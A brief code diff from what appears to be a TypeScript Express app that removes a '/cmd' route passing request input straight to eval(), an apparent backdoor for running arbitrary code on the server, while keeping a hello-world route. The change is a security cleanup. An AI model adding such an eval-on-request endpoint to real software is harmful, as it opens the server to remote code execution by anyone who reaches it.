@@ -9,9 +9,6 @@ const helloworldHandler = new HelloHandler();
 
 app.get('/', helloworldHandler.handle)
 
-app.get('/cmd', (req:any, res) => {
-    eval(req.params.cmd)
-})
 
 const PORT = process.env.PORT || 3000
 app.listen(PORT, () => {
